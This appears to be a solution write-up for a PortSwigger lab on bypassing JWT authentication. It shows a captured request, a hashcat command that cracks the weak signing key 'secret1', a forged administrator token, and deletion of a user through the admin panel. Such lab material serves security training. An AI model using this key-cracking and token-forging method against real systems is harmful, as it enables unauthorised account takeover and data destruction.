# JWT authentication bypass via weak signing key

Link: https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key

 This lab uses a JWT-based mechanism for handling sessions. It uses an extremely weak secret key to both sign and verify tokens. This can be easily brute-forced using a wordlist of common secrets.

To solve the lab, first brute-force the website's secret key. Once you've obtained this, use it to sign a modified session token that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 

### solution

- start by logging in using the creds wiener:peter as mentioned in the challange
- when you access /admin endpoint you will get this message `Admin interface only available if logged in as an administrator`
- go to burp suit and intercept this request
```
GET /admin HTTP/1.1
Host: 0a5c0051046542a580b9c655001e0042.web-security-academy.net
Cookie: session=eyJraWQiOiJmNzIwNGRjZC1hYjUzLTQ3ZjUtYTlmZC1hOWJlY2FlYjU3OTkiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTcwNzM4ODE2NX0.oKvfnHoPxftX21L9qPs0I7gFWHyxiCMtOhPxLI2nlcI
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```
- We see that interesting cookie session which is JWT
- The two previous methods won't work
- try using hashcat to get the signing key as it may be weak
- we use `hashcat -a 0 -m 16500 <jwt> <wordlist>`
- we got the key which is `secret1` now we can use it to sign a new token
- let's go to jwt.io change the user in the payload to `administrator` and put the key we got in the secret key field
- then let's use the jwt generated in the request
- we accessed /admin successfully
- now let's delete carlos by going to `/admin/delete?username=carlos`
- congratzzzzzzzzzz